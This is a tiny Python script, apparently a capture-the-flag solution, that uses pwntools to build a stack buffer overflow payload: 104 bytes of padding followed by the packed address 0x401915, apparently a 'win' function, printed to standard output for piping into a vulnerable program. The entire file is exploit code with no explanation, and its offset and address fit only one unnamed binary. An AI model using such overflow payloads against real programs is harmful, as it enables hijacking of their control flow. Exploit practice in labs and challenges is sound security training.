import sys
from pwn import *
payload = b"A" * 104
win = p64(0x401915)
payload += win
sys.stdout.buffer.write(payload)
